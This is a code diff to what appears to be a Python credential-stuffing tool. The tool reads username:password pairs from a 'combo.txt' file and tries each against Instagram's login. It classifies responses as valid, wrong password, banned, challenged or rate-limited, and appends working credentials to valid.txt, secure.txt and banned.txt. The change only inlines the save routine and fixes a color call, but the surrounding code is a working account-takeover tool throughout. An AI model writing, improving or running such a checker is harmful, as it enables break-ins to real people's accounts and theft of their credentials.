@@ -61,14 +61,10 @@ class Files:
             print("[" + self.c.color("GREEN","SETTINGS-FILES") + f"] Successfully Create File '{self.c.color('GREEN','combo.txt')}'\n[{self.c.color('GREEN','SETTINGS-FILES')}] Please Open File '{self.c.color('GREEN','combo.txt')}' And Enter Combo\n[{self.c.color('GREEN','SETTINGS-FILES')}] Press Enter To Exit")
             input()
             exit(0)
-    def saved(self, username, password, status):
-        with open(status, 'a') as self.saved:
-            self.saved.write(username + ':' + password + '\n')
 class Instagram:
     def __init__(self):
         self.Color = Color()
         self.HTTP = HTTP()
-        self.Files = Files()
         self.q = Queue()
         self.valid = 0
         self.bad_password = 0
@@ -87,7 +83,7 @@ class Instagram:
             self.InstagramBruteForce(combo)
         if self.q.empty():
             self.N = 1
-            print("[" + self.c.color("GREEN","SYSTEM") + f"] Successfully Check All Account '{self.c.color('GREEN','combo.txt')}'\n[{self.c.color('GREEN','SYSTEM')}] Press Enter To Exit")
+            print("[" + self.Color.color("GREEN","SYSTEM") + f"] Successfully Check All Account '{self.Color.color('GREEN','combo.txt')}'\n[{self.Color.color('GREEN','SYSTEM')}] Press Enter To Exit")
             input()
     def InstagramBruteForce(self, combo):
         self.username = combo.split(':')[0]
@@ -98,18 +94,21 @@ class Instagram:
             if 'userId' in self.req.text:
                 self.valid +=1
                 ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Banned {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.banned, self.error)))
-                self.Files.saved(self.username, self.password, 'valid.txt')
+                with open('valid.txt', 'a') as self.saved:
+                    self.saved.write(self.username + ':' + self.password + '\n')
             elif '"authenticated":false' in self.req.text:
                 self.bad_password +=1
                 ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Banned {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.banned, self.error)))
             elif 'https://help.instagram' in self.req.text:
                 self.banned +=1
                 ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Banned {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.banned, self.error)))
-                self.Files.saved(self.username, self.password, 'banned.txt')
+                with open('banned.txt', 'a') as self.saved:
+                    self.saved.write(self.username + ':' + self.password + '\n')
             elif '/challenge' in self.req.text:
                 self.secure +=1
                 ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Banned {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.banned, self.error)))
-                self.Files.saved(self.username, self.password, 'secure.txt')
+                with open('secure.txt', 'a') as self.saved:
+                    self.saved.write(self.username + ':' + self.password + '\n')
             elif self.req.status_code == 429:
                 self.error +=1
                 ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Banned {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.banned, self.error)))
